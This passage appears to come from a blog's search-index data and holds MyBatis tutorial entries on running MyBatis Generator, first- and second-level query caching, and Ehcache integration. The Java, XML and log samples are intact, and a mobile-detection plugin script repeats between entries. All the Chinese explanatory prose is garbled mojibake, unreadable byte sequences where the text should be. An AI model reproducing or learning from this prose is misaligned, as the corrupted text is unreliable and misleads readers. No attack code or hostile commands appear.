MyBatis3Simpleã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œåœ¨ä¼ä¸šé¡¹ç›®å¼€å‘ä¸­ï¼Œç”¨å¾—æœ€å¤šçš„æ˜¯ targetRuntime="MyBatis3"ï¼Œå®ƒæ”¯æŒå¤æ‚æ¡ä»¶æŸ¥è¯¢ï¼ˆQBC æŸ¥è¯¢ï¼‰å’Œè‡ªåŠ¨ç”Ÿæˆå¤§é‡åŠ¨æ€ SQL è¯­å¥ã€‚MyBatis Generator å®Œæ•´çš„ XML æ ‡ç­¾ä»‹ç»å¯çœ‹ è¿™é‡Œã€‚ è¿è¡Œä»£ç ç”Ÿæˆå™¨MyBatis Generator (MBG) å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è¿è¡Œï¼š From the command prompt with an XML configuration As an Ant task with an XML configuration As a Maven Plugin From another Java program with an XML configuration From another Java program with a Java based configuration As an Eclipse Feature è¿™é‡Œé‡‡ç”¨ Java ä»£ç  + XML é…ç½®æ–‡ä»¶çš„æ–¹å¼è¿è¡Œä»£ç ç”Ÿæˆå™¨ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425import java.io.File;import java.net.URL;import java.util.ArrayList;import java.util.List;import org.mybatis.generator.api.MyBatisGenerator;import org.mybatis.generator.config.Configuration;import org.mybatis.generator.config.xml.ConfigurationParser;import org.mybatis.generator.internal.DefaultShellCallback;public class GeneratorTest { public static void main(String[] args) throws Exception { List&lt;String&gt; warnings = new ArrayList&lt;String&gt;(); boolean overwrite = true; URL url = GeneratorTest.class.getClassLoader().getResource("mybatis-generator.xml"); File configFile = new File(url.getFile()); ConfigurationParser cp = new ConfigurationParser(warnings); Configuration config = cp.parseConfiguration(configFile); DefaultShellCallback callback = new DefaultShellCallback(overwrite); MyBatisGenerator myBatisGenerator = new MyBatisGenerator(config, callback, warnings); myBatisGenerator.generate(null); }} æœ€åä¼šåœ¨é¡¹ç›®çš„ç›®å½•å†…è‡ªåŠ¨ç”Ÿæˆ JavaBean ç±»ã€Mapper æ¥å£å’Œ SQL æ˜ å°„æ–‡ä»¶ï¼Œé¡¹ç›®çš„ç›®å½•ç»“æ„å›¾å¦‚ä¸‹ï¼š MyBatis å·¥ä½œåŸç†å·¥ä½œåŸç†å›¾ä¸€ å·¥ä½œåŸç†å›¾äºŒ MyBatis æºç åˆ†æ ä¸€æœ¬å°å°çš„ MyBatis æºç åˆ†æä¹¦ æ€’è‚ä¸€å¤œ | Mybatis æºç æ·±åº¦è§£æ MyBatis 3.x æºç æ·±åº¦è§£æä¸æœ€ä½³å®è·µ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java æ•°æ®åº“"},{title:"Java å¤§æ•°æ®çŸ¥è¯†å›¾è°± (æœ€æ–°)",url:"/posts/9e38efb3.html",text:'åŸºç¡€çŸ¥è¯†ä½“ç³» Hadoop ç”Ÿæ€ä½“ç³» Spark ç”Ÿæ€ä½“ç³» æœºå™¨å­¦ä¹ å’Œç®—æ³• å¹³å°æ¶æ„å¸ˆä½“ç³» var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"çŸ¥è¯†å›¾è°±"},{title:"MyBatis å…¥é—¨æ•™ç¨‹ä¹‹å…­",url:"/posts/77bb067c.html",text:'ç¼“å­˜æœºåˆ¶MyBatis å†…ç½®äº†ä¸€ä¸ªå¼ºå¤§çš„äº‹åŠ¡æ€§æŸ¥è¯¢ç¼“å­˜æœºåˆ¶ï¼Œå®ƒå¯ä»¥éå¸¸æ–¹ä¾¿åœ°é…ç½®å’Œå®šåˆ¶ã€‚MyBatis ä¸­é»˜è®¤å®šä¹‰äº†ä¸¤çº§ç¼“å­˜ï¼š ä¸€çº§ç¼“å­˜å’ŒäºŒçº§ç¼“å­˜ é»˜è®¤æƒ…å†µä¸‹ï¼Œåªæœ‰ä¸€çº§ç¼“å­˜ï¼ˆSqlSession çº§åˆ«çš„ç¼“å­˜ï¼Œä¹Ÿç§°ä¸ºæœ¬åœ°ç¼“å­˜ï¼‰å¼€å¯ äºŒçº§ç¼“å­˜éœ€è¦æ‰‹åŠ¨å¼€å¯å’Œé…ç½®ï¼Œå®ƒæ˜¯åŸºäº namespace çº§åˆ«çš„ç¼“å­˜ ä¸ºäº†æé«˜æ‰©å±•æ€§ï¼ŒMyBatis å®šä¹‰äº†ç¼“å­˜æ¥å£ Cacheï¼Œå¯ä»¥é€šè¿‡å®ç° Cache æ¥å£æ¥è‡ªå®šä¹‰äºŒçº§ç¼“å­˜ ä¸€çº§ç¼“å­˜ä¸€çº§ç¼“å­˜ä»‹ç» ä¸€çº§ç¼“å­˜ï¼ˆlocal cacheï¼‰ï¼Œå³æœ¬åœ°ç¼“å­˜ï¼Œä½œç”¨åŸŸé»˜è®¤ä¸º SqlSessionã€‚å½“ Session æ‰§è¡Œ flush æˆ– close æ“ä½œåï¼Œè¯¥ Session ä¸­çš„æ‰€æœ‰ Cache å°†è¢«æ¸…ç©ºã€‚ æœ¬åœ°ç¼“å­˜é»˜è®¤æ˜¯ä¸€ç›´å¼€å¯çš„ï¼ˆä¸èƒ½è¢«å…³é—­ï¼‰ï¼Œä½†å¯ä»¥è°ƒç”¨ sqlSession.clearCache() æ¥æ¸…ç©ºæœ¬åœ°ç¼“å­˜ï¼Œæˆ–è€…æ”¹å˜ç¼“å­˜çš„ä½œç”¨åŸŸã€‚ åœ¨ MyBatis 3.1 ä¹‹åï¼Œæ”¯æŒé…ç½®æœ¬åœ°ç¼“å­˜çš„ä½œç”¨åŸŸï¼Œåœ¨ mybatis.xml ä¸­é…ç½® localCacheScope å±æ€§å³å¯ã€‚MyBatis åˆ©ç”¨æœ¬åœ°ç¼“å­˜å¯ä»¥é˜²æ­¢å¾ªç¯å¼•ç”¨å’ŒåŠ é€Ÿé‡å¤åµŒå¥—æŸ¥è¯¢ã€‚localCacheScope å±æ€§çš„å¯é€‰å€¼ä¸º SESSION | STATEMENTï¼Œé»˜è®¤å€¼ä¸º SESSIONï¼Œè¿™ç§æƒ…å†µä¸‹ä¼šç¼“å­˜ä¸€ä¸ªä¼šè¯ä¸­æ‰§è¡Œçš„æ‰€æœ‰æŸ¥è¯¢ã€‚è‹¥è®¾ç½®å€¼ä¸º STATEMENTï¼Œæœ¬åœ°ä¼šè¯ä»…ç”¨åœ¨è¯­å¥æ‰§è¡Œä¸Šï¼Œå¯¹ç›¸åŒ SqlSession çš„ä¸åŒè°ƒç”¨å°†ä¸ä¼šå…±äº«æ•°æ®ã€‚ åŒä¸€ä¸ªä¼šè¯æœŸé—´ï¼Œåªè¦æŸ¥è¯¢è¿‡çš„æ•°æ®éƒ½ä¼šè¢«ä¿å­˜åœ¨å½“å‰ SqlSession çš„ä¸€ä¸ª Map ä¸­ï¼Œå®ƒçš„ key ç”± HashCode + æŸ¥è¯¢çš„ SqlId + ç¼–å†™çš„ SQL æŸ¥è¯¢è¯­å¥ + å‚æ•° æ„æˆã€‚ ä¸€çº§ç¼“å­˜ä½¿ç”¨æ¡ˆä¾‹æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-lesson-16ã€‚ 12345678910111213141516171819202122232425262728public class MyBatisApplication { public static void main(String[] args) throws IOException { String resource = "mybatis-config.xml"; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); SqlSession session = sqlSessionFactory.openSession(); try { EmployeeMapper mapper = session.getMapper(EmployeeMapper.class); // ç¬¬ä¸€æ¬¡æŸ¥è¯¢ Employee employee = mapper.getEmpById(1L); // ç¬¬äºŒæ¬¡æŸ¥è¯¢ Employee employee2 = mapper.getEmpById(1L); // åˆ¤æ–­ä¸¤æ¬¡æŸ¥è¯¢åˆ°çš„å¯¹è±¡çš„åœ°å€æ˜¯å¦ä¸€è‡´ System.out.println(employee == employee2); } finally { if (session != null) { session.close(); } } }} ä¸Šè¿°ä»£ç æ‰§è¡Œä¹‹åï¼Œå¯ä»¥å‘ç° MyBatis åªä¼šå‘å‡ºä¸€æ¡ SQL è¯­å¥ï¼ˆå¦‚ä¸‹æ‰€ç¤ºï¼‰ï¼Œä¸”ä¸¤æ¬¡æŸ¥è¯¢åˆ°çš„å¯¹è±¡çš„åœ°å€æ˜¯ç›¸åŒçš„ï¼Œå³å±äºåŒä¸€ä¸ªå¯¹è±¡ï¼Œè¿™æ˜¯ç”±äº MyBatis ä¸€çº§ç¼“å­˜ï¼ˆé»˜è®¤å¼€å¯ï¼‰èµ·çš„ä½œç”¨ã€‚ 123422:36:12,278 DEBUG getEmpById:137 - ==&gt; Preparing: select id, last_name as lastName, gender, email from t_employee where id = ?22:36:12,317 DEBUG getEmpById:137 - ==&gt; Parameters: 1(Long)22:36:12,350 DEBUG getEmpById:137 - &lt;== Total: 1true ä¸€çº§ç¼“å­˜å¤±æ•ˆçš„åœºæ™¯ä¸€çº§ç¼“å­˜å¤±æ•ˆçš„å››ç§åœºæ™¯ï¼š ä½¿ç”¨ä¸åŒçš„ SqlSession è¿›è¡ŒæŸ¥è¯¢ åŒä¸€ä¸ª SqlSessionï¼Œä½†æ˜¯æŸ¥è¯¢æ¡ä»¶ä¸åŒ åŒä¸€ä¸ª SqlSessionï¼Œä½†æ˜¯åœ¨ä¸¤æ¬¡æŸ¥è¯¢æœŸé—´æ‰‹åŠ¨æ¸…ç©ºäº†ä¸€çº§ç¼“å­˜ åŒä¸€ä¸ª SqlSessionï¼Œä½†æ˜¯åœ¨ä¸¤æ¬¡æŸ¥è¯¢æœŸé—´æ‰§è¡Œäº†ä»»ä½•ä¸€æ¬¡å¢åˆ æ”¹æ“ä½œ äºŒçº§ç¼“å­˜äºŒçº§ç¼“å­˜ä»‹ç» äºŒçº§ç¼“å­˜é»˜è®¤ä¸å¼€å¯ï¼Œéœ€è¦æ‰‹åŠ¨é…ç½® äºŒçº§ç¼“å­˜åœ¨ SqlSession æäº¤æˆ–å…³é—­ä¹‹åæ‰ä¼šç”Ÿæ•ˆ MyBatis æä¾›äºŒçº§ç¼“å­˜çš„æ¥å£ä»¥åŠå®ç°ï¼Œç¼“å­˜å®ç°è¦æ±‚ POJO å®ç° Serializable æ¥å£ å½“ SqlSession æäº¤æˆ–è€…å…³é—­åï¼Œä¸€çº§ç¼“å­˜ä¸­çš„æ•°æ®ä¼šè¢«ä¿å­˜åˆ°äºŒçº§ç¼“å­˜ä¸­ï¼Œä¸‹æ¬¡ä½¿ç”¨æ–°çš„ä¼šè¯è¿›è¡ŒæŸ¥è¯¢æ—¶ï¼Œå°±å¯ä»¥ä½¿ç”¨åˆ°äºŒçº§ç¼“å­˜çš„æ•°æ® äºŒçº§ç¼“å­˜ï¼ˆsecond level cacheï¼‰æ˜¯å…¨å±€ä½œç”¨åŸŸç¼“å­˜ï¼Œå¹¶ä¸”æ˜¯åŸºäº namespace çº§åˆ«çš„ç¼“å­˜ï¼Œä¸€ä¸ª namespace å¯¹åº”ä¸€ä¸ªäºŒçº§ç¼“å­˜ï¼›ä¸åŒ namespace æŸ¥è¯¢å‡ºçš„æ•°æ®ä¼šæ”¾åœ¨è‡ªå·±å¯¹åº”çš„ç¼“å­˜ï¼ˆMapï¼‰ä¸­ äºŒçº§ç¼“å­˜å¯ç”¨æ­¥éª¤ ç¬¬ä¸€æ­¥ã€åœ¨ MyBatis çš„å…¨å±€é…ç½®æ–‡ä»¶ä¸­å¼€å¯äºŒçº§ç¼“å­˜ &lt;setting name= "cacheEnabled" value="true"/&gt; ç¬¬äºŒæ­¥ã€åœ¨éœ€è¦ä½¿ç”¨äºŒçº§ç¼“å­˜çš„ SQL æ˜ å°„æ–‡ä»¶é‡Œæ·»åŠ  &lt;cache&gt; æ ‡ç­¾æ¥é…ç½®ç¼“å­˜ ç¬¬ä¸‰æ­¥ã€POJOï¼ˆPlain Ordinary Java Object - ç®€å•çš„ Java å¯¹è±¡ï¼‰éœ€è¦å®ç° Serializable æ¥å£ äºŒçº§ç¼“å­˜ç›¸å…³å±æ€§åœ¨ MyBatis çš„ SQL æ˜ å°„æ–‡ä»¶ä¸­ï¼Œ&lt;cache&gt; æ ‡ç­¾æ‹¥æœ‰ä»¥ä¸‹å±æ€§ï¼š äºŒçº§ç¼“å­˜ç›¸å…³è®¾ç½® å…¨å±€é…ç½®ä¸­çš„ cacheEnable æ ‡ç­¾ï¼šå¯ç”¨äºŒçº§ç¼“å­˜çš„å¼€å…³ï¼ŒäºŒçº§ç¼“å­˜é»˜è®¤æ˜¯å…³é—­çš„ï¼Œä¸€çº§ç¼“å­˜æ˜¯ä¸€ç›´æ˜¯å¼€å¯çš„ select æ ‡ç­¾çš„ useCache å±æ€§ï¼šé…ç½®å½“å‰çš„ select è¯­å¥æ˜¯å¦ä½¿ç”¨äºŒçº§ç¼“å­˜ï¼Œä¸€çº§ç¼“å­˜ä¸€ç›´æ˜¯ä½¿ç”¨çš„ SQL æ ‡ç­¾çš„ flushCache å±æ€§ï¼šå¢åˆ æ”¹æ“ä½œé»˜è®¤æ˜¯ flushCache=trueï¼Œå³ SQL æ‰§è¡Œä»¥åä¼šåŒæ—¶æ¸…ç©ºä¸€çº§å’ŒäºŒçº§ç¼“å­˜ï¼Œè€ŒæŸ¥è¯¢æ“ä½œé»˜è®¤æ˜¯ flushCache=false sqlSession.clearCache()ï¼šåªæ˜¯ç”¨æ¥æ¸…é™¤ä¸€çº§ç¼“å­˜ å…¨å±€é…ç½®ä¸­çš„ localCacheScope å±æ€§ï¼šæœ¬åœ°ç¼“å­˜ä½œç”¨åŸŸï¼ˆSESSION | STATEMENTï¼‰ï¼Œè®¾ç½®ä¸º SESSION æ—¶ï¼Œå½“å‰ä¼šè¯çš„æ‰€æœ‰æ•°æ®ä¼šè¢«ç¼“å­˜åˆ°ä¼šè¯é‡Œï¼›è®¾ç½®å€¼ä¸º STATEMENT æ—¶ï¼Œæœ¬åœ°ä¼šè¯ä»…ç”¨åœ¨è¯­å¥æ‰§è¡Œä¸Šï¼Œå¯¹ç›¸åŒ SqlSession çš„ä¸åŒè°ƒç”¨å°†ä¸ä¼šå…±äº«æ•°æ® å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå½“åœ¨æŸä¸€ä¸ªä½œç”¨åŸŸï¼ˆä¸€çº§ç¼“å­˜ / äºŒçº§ç¼“å­˜) è¿›è¡Œäº†å¢åˆ æ”¹æ“ä½œåï¼Œé»˜è®¤è¯¥ä½œç”¨åŸŸä¸‹çš„æ‰€æœ‰ç¼“å­˜æ•°æ®å°†è¢«æ¸…ç©ºã€‚ äºŒçº§ç¼“å­˜ä½¿ç”¨æ¡ˆä¾‹æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-lesson-17ã€‚ ç‰¹åˆ«æ³¨æ„ 1ã€äºŒçº§ç¼“å­˜åœ¨ SqlSession æäº¤æˆ–å…³é—­ä¹‹åæ‰ä¼šç”Ÿæ•ˆ 2ã€å½“ SqlSession æäº¤æˆ–è€…å…³é—­åï¼Œä¸€çº§ç¼“å­˜ä¸­çš„æ•°æ®ä¼šè¢«ä¿å­˜åˆ°äºŒçº§ç¼“å­˜ä¸­ï¼Œä¸‹æ¬¡ä½¿ç”¨æ–°çš„ä¼šè¯è¿›è¡ŒæŸ¥è¯¢æ—¶ï¼Œå°±å¯ä»¥ä½¿ç”¨åˆ°äºŒçº§ç¼“å­˜çš„æ•°æ® å…¨å±€é…ç½®æ–‡ä»¶ 12345678910111213&lt;configuration&gt; &lt;!-- å¼€å¯äºŒçº§ç¼“å­˜ --&gt; &lt;settings&gt; &lt;setting name="cacheEnabled" value="true" /&gt; &lt;/settings&gt; &lt;!-- SQLæ˜ å°„æ–‡ä»¶ --&gt; &lt;mappers&gt; &lt;mapper resource="com/clay/mybatis/dao/EmployeeMapper.xml" /&gt; &lt;/mappers&gt;&lt;/configuration&gt; SQL æ˜ å°„æ–‡ä»¶ 123456789101112&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;!-- ä½¿ç”¨äºŒçº§ç¼“å­˜ --&gt; &lt;cache /&gt; &lt;select id="getEmpById" parameterType="Long" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where id = #{id} &lt;/select&gt;&lt;/mapper&gt; Java ä»£ç  1234567891011121314151617181920212223242526272829303132333435public class MyBatisApplication { public static void main(String[] args) throws IOException { String resource = "mybatis-config.xml"; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); SqlSession session = sqlSessionFactory.openSession(); SqlSession session2 = sqlSessionFactory.openSession(); try { // ç¬¬ä¸€æ¬¡æŸ¥è¯¢ EmployeeMapper mapper = session.getMapper(EmployeeMapper.class); Employee employee = mapper.getEmpById(1L); // ä¼šè¯æäº¤ session.commit(); // ç¬¬äºŒæ¬¡æŸ¥è¯¢ EmployeeMapper mapper2 = session2.getMapper(EmployeeMapper.class); Employee employee2 = mapper2.getEmpById(1L); // ä¼šè¯æäº¤ session2.commit(); } finally { closeSesson(session); closeSesson(session2); } } public static void closeSesson(SqlSession session) { if (session != null) { session.close(); session = null; } }} æ‰§è¡Œä¸Šè¿°çš„ä»£ç ï¼Œå¯ä»¥å‘ç° MyBatis åªä¼šå‘å‡ºä¸€æ¡ SQL è¯­å¥ï¼ˆå¦‚ä¸‹æ‰€ç¤ºï¼‰ï¼Œè¿™è¯´æ˜äºŒçº§ç¼“å­˜èµ·äº†ä½œç”¨ã€‚ 12322:55:46,112 DEBUG getEmpById:137 - ==&gt; Preparing: select id, last_name as lastName, gender, email from t_employee where id = ?22:55:46,164 DEBUG getEmpById:137 - ==&gt; Parameters: 1(Long)22:55:46,203 DEBUG getEmpById:137 - &lt;== Total: 1 ä¸€çº§ä¸äºŒçº§ç¼“å­˜åŸç†å›¾è§£ æ•´åˆ Ehcache ç¬¬ä¸‰æ–¹ç¼“å­˜EhCache æ˜¯ä¸€ä¸ªçº¯ Java å®ç°çš„è¿›ç¨‹å†…ç¼“å­˜æ¡†æ¶ï¼Œå…·æœ‰å¿«é€Ÿã€ç²¾å¹²ç­‰ç‰¹ç‚¹ï¼Œæ˜¯ Hibernate ä¸­é»˜è®¤çš„ CacheProviderã€‚ Ehcache ç¬¬ä¸‰æ–¹ç¼“å­˜æ•´åˆæ­¥éª¤ 1ã€å¼•å…¥æ ¸å¿ƒçš„ä¾èµ–åŒ…ï¼ŒåŒ…æ‹¬ Ehcache åŒ…ã€MyBatis æ•´åˆåŒ…ã€æ—¥å¿—åŒ… 12345678910111213141516171819202122232425&lt;dependency&gt; &lt;groupId&gt;net.sf.ehcache&lt;/groupId&gt; &lt;artifactId&gt;ehcache-core&lt;/artifactId&gt; &lt;version&gt;2.6.11&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.mybatis.caches&lt;/groupId&gt; &lt;artifactId&gt;mybatis-ehcache&lt;/artifactId&gt; &lt;version&gt;1.2.2&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt; &lt;version&gt;1.7.30&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt; &lt;version&gt;1.7.30&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;version&gt;1.2.17&lt;/version&gt;&lt;/dependency&gt; 2ã€åœ¨é¡¹ç›®çš„ src/main/resources ç›®å½•ä¸‹åˆ›å»º ehcache.xml é…ç½®æ–‡ä»¶ 1234567891011121314151617&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;ehcache xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="../config/ehcache.xsd"&gt; &lt;diskStore path="/tmp/ehcache" /&gt; &lt;defaultCache maxElementsInMemory="10000" maxElementsOnDisk="10000000" eternal="false" overflowToDisk="true" timeToIdleSeconds="120" timeToLiveSeconds="120" diskExpiryThreadIntervalSeconds="120" memoryStoreEvictionPolicy="LRU"&gt; &lt;/defaultCache&gt;&lt;/ehcache&gt; æ ‡ç­¾ è¯´æ˜ diskStore æŒ‡å®šç¼“å­˜æ•°æ®åœ¨ç£ç›˜ä¸­çš„å­˜å‚¨ä½ç½® defaultCache å½“å€ŸåŠ© CacheManager.add("demoCache") åˆ›å»º Cache æ—¶ï¼ŒEhCache ä¾¿ä¼šé‡‡ç”¨ &lt;defalutCache&gt; æ ‡ç­¾æŒ‡å®šçš„çš„ç¼“å­˜ç®¡ç†ç­–ç•¥ å±æ€§ å¿…å¡« è¯´æ˜ maxElementsInMemory æ˜¯ åœ¨å†…å­˜ä¸­ç¼“å­˜çš„ Element çš„æœ€å¤§æ•°é‡ maxElementsOnDisk æ˜¯ åœ¨ç£ç›˜ä¸Šç¼“å­˜çš„ Element çš„æœ€å¤§æ•°é‡ï¼Œè‹¥æ˜¯ 0 åˆ™è¡¨ç¤ºæ— ç©·å¤§ eternal æ˜¯ è®¾å®šç¼“å­˜çš„ Elements æ˜¯å¦æ°¸è¿œä¸è¿‡æœŸã€‚å¦‚æœä¸º trueï¼Œåˆ™ç¼“å­˜çš„æ•°æ®å§‹ç»ˆæœ‰æ•ˆï¼Œå¦‚æœä¸º false ï¼Œåˆ™éœ€è¦æ ¹æ® timeToIdleSeconds ä¸ timeToLiveSeconds è¿›è¡Œåˆ¤æ–­ overflowToDisk æ˜¯ è®¾å®šå½“å†…å­˜ç¼“å­˜æº¢å‡ºçš„æ—¶å€™ï¼Œæ˜¯å¦å°†è¿‡æœŸçš„ Element ç¼“å­˜åˆ°ç£ç›˜ä¸Š timeToIdleSeconds å¦ å½“ç¼“å­˜åœ¨ EhCache ä¸­çš„æ•°æ®å‰åä¸¤æ¬¡è®¿é—®çš„æ—¶é—´è¶…è¿‡ timeToIdleSeconds çš„å±æ€§å–å€¼æ—¶ï¼Œè¿™äº›æ•°æ®ä¾¿ä¼šåˆ é™¤ï¼Œé»˜è®¤å€¼æ˜¯ 0ï¼Œè¡¨ç¤ºç¼“å­˜æ•°æ®çš„å¯é—²ç½®æ—¶é—´æ— ç©·å¤§ timeToLiveSeconds å¦ ç¼“å­˜ Element çš„æœ‰æ•ˆç”Ÿå‘½æœŸï¼Œé»˜è®¤æ˜¯ 0ï¼Œè¡¨ç¤º Element çš„å­˜æ´»æ—¶é—´æ— ç©·å¤§ diskSpoolBufferSizeMB å¦ è¿™ä¸ªå‚æ•°è®¾ç½® DiskStoreï¼ˆç£ç›˜ç¼“å­˜ï¼‰ çš„ç¼“å­˜åŒºå¤§å°ã€‚é»˜è®¤æ˜¯ 30MBï¼Œæ¯ä¸ª Cache éƒ½åº”è¯¥æœ‰è‡ªå·±çš„ä¸€ä¸ªç¼“å†²åŒº diskPersistent å¦ åœ¨ VM é‡å¯çš„æ—¶å€™æ˜¯å¦å¯ç”¨ç£ç›˜ä¿å­˜ EhCache ä¸­çš„æ•°æ®ï¼Œé»˜è®¤æ˜¯ false diskExpiryThreadIntervalSeconds å¦ ç£ç›˜ç¼“å­˜çš„æ¸…ç†çº¿ç¨‹è¿è¡Œé—´éš”ï¼Œé»˜è®¤æ˜¯ 120 ç§’ã€‚æ¯éš” 120 ç§’ï¼Œç›¸åº”çš„çº¿ç¨‹ä¼šè¿›è¡Œä¸€æ¬¡ EhCache ä¸­æ•°æ®çš„æ¸…ç†å·¥ä½œ memoryStoreEvictionPolicy å¦ å½“å†…å­˜ç¼“å­˜è¾¾åˆ°æœ€å¤§ï¼Œæœ‰æ–°çš„ Element åŠ å…¥çš„æ—¶å€™ï¼Œç§»é™¤ç¼“å­˜ä¸­ Element çš„ç­–ç•¥ã€‚é»˜è®¤æ˜¯ LRUï¼ˆæœ€è¿‘æœ€å°‘ä½¿ç”¨ï¼‰ï¼Œå¯é€‰å€¼è¿˜æœ‰ LFUï¼ˆæœ€ä¸å¸¸ä½¿ç”¨ï¼‰ å’Œ FIFOï¼ˆå…ˆè¿›å…ˆå‡ºï¼‰ 3ã€é…ç½® MyBatis å…¨å±€é…ç½®æ–‡ä»¶ï¼Œå¼€å¯äºŒçº§ç¼“å­˜ 12345678&lt;configuration&gt; &lt;!-- å¼€å¯äºŒçº§ç¼“å­˜ --&gt; &lt;settings&gt; &lt;setting name="cacheEnabled" value="true" /&gt; &lt;/settings&gt;&lt;/configuration&gt; 4ã€é…ç½® SQL æ˜ å°„æ–‡ä»¶ï¼Œæ·»åŠ  &lt;cache&gt; æ ‡ç­¾ 123456&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;!-- æŒ‡å®š EhCache ä½œä¸ºäºŒçº§ç¼“å­˜çš„å®ç° --&gt; &lt;cache type="org.mybatis.caches.ehcache.EhcacheCache"/&gt;&lt;/mapper&gt; æç¤º äºŒçº§ç¼“å­˜æ˜¯å…¨å±€ä½œç”¨åŸŸç¼“å­˜ï¼Œå¹¶ä¸”æ˜¯åŸºäº namespace çº§åˆ«çš„ç¼“å­˜ï¼Œä¸€ä¸ª namespace å¯¹åº”ä¸€ä¸ªäºŒçº§ç¼“å­˜ï¼Œä¸åŒ namespace æŸ¥è¯¢å‡ºçš„æ•°æ®ä¼šæ”¾åœ¨è‡ªå·±å¯¹åº”çš„ç¼“å­˜ï¼ˆMapï¼‰ä¸­ è‹¥æƒ³åœ¨å‘½åç©ºé—´ï¼ˆnamespaceï¼‰ä¸­å…±äº«ç›¸åŒçš„ç¼“å­˜é…ç½®å’Œå®ä¾‹ï¼Œåˆ™å¯ä»¥åœ¨ SQL æ˜ å°„æ–‡ä»¶é‡Œä½¿ç”¨ &lt;cache-ref&gt; æ ‡ç­¾æ¥å¼•ç”¨å¦å¤–ä¸€ä¸ªç¼“å­˜ å‡è®¾åœ¨ DepartmentMapper.xml æ˜ å°„æ–‡ä»¶ä¸­ï¼Œæƒ³å¼•ç”¨ com.clay.mybatis.dao.EmployeeMapper å‘½åç©ºé—´çš„äºŒçº§ç¼“å­˜ï¼Œå¯ä»¥ä½¿ç”¨ &lt;cache-ref&gt; æ ‡ç­¾æ¥å®ç°ï¼š 123456&lt;mapper namespace="com.clay.mybatis.dao.DepartmentMapper"&gt; &lt;!-- å¼•ç”¨ç¼“å­˜ï¼Œnamespaceï¼šæŒ‡å®šå’Œå“ªä¸ªå‘½åç©ºé—´ä¸‹çš„äºŒçº§ç¼“å­˜ä¸€æ · --&gt; &lt;cache-ref namespace="com.clay.mybatis.dao.EmployeeMapper"/&gt;&lt;/mapper&gt; 5ã€éªŒè¯æ•´åˆç»“æœ è¿è¡Œé¡¹ç›®åï¼Œè‹¥è¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯é‡Œæœ‰ä¸‹é¢ç±»ä¼¼çš„å†…å®¹ï¼Œåˆ™è¯´æ˜ MyBatis æˆåŠŸæ•´åˆäº† EhCacheï¼Œæˆ–è€…å¯ä»¥æŸ¥çœ‹ &lt;diskStore&gt; æ ‡ç­¾æŒ‡å®šçš„å­˜å‚¨ä½ç½®ä¸‹æœ‰æ²¡æœ‰ç”Ÿæˆæ•°æ®æ–‡ä»¶æ¥éªŒè¯æ•´åˆç»“æœã€‚ 12323:35:03,108 DEBUG Segment:425 - put added 0 on heap23:35:03,128 DEBUG Segment:779 - fault removed 0 from heap23:35:03,129 DEBUG Segment:796 - fault added 0 on disk ä½¿ç”¨ç¬¬ä¸‰æ–¹ç¼“å­˜çš„æŸ¥è¯¢æµç¨‹å›¾å½“æ‰§è¡Œä¸€æ¡æŸ¥è¯¢ SQL æ—¶ï¼Œé¦–å…ˆä»äºŒçº§ç¼“å­˜ä¸­è¿›è¡ŒæŸ¥è¯¢ï¼Œç„¶åè¿›å…¥ä¸€çº§ç¼“å­˜ä¸­æŸ¥è¯¢ï¼Œæœ€åæ‰§è¡Œ JDBC æŸ¥è¯¢ã€‚ var isMobile = 